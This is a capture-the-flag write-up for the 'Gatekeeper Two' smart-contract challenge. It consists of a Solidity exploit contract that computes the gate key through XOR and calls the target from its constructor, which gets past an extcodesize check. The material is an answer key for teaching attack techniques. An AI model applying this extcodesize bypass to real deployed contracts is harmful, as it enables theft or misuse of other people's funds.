# 14 - Gatekeeper Two

### Scripted Solution

```solidity
// SPDX-License-Identifier

pragma solidity 0.6.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external;
}

contract GatekeeperTwoExploit {
    /**
     * Constructor calculates the `gateKey` using the property of XOR:
     *
     * A ^ B = C
     * A ^ C = B
     *
     * Constructor then calls the 'GatekeeperTwo' contract's `enter` function
     * with the `gateKey`. As this code is being run in the constructor, the
     * `extcodesize` check of the caller will equal 0.
     */
    constructor(address gateKeeperContractAddress) public {
        uint64 gateKey = uint64(
            bytes8(keccak256(abi.encodePacked(address(this))))
        ) ^ (uint64(0) - 1);

        IGatekeeperTwo(gateKeeperContractAddress).enter(bytes8(gateKey));
    }
}
```
